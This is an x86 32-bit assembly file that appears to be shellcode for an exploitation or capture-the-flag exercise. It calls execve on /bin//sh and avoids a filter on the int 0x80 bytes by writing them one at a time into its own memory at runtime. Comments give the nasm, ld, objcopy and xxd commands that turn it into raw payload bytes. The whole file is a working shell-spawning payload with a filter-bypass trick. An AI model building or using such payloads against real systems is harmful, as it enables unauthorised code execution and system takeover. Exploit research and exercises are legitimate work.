bits 32

; execve("/bin//sh", NULL, NULL)
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0x0b

call get_eip
get_eip:
    pop esi         ; esi = current address (inside __buf)

; calculate offset to write INT 0x80 at the end
add esi, 2        

; !!! mov word [esi], 0x80CD --> FORBITTEN !!!

mov byte [esi], 0xCD
mov byte [esi+1], 0x80

call esi            ; call the constructed INT 0x80


;nasm -f elf32  shellcraft32.asm
;ld -m elf_i386 shellcraft32.o
;objcopy --dump-section .text=sc a.out
;xxd -p sc

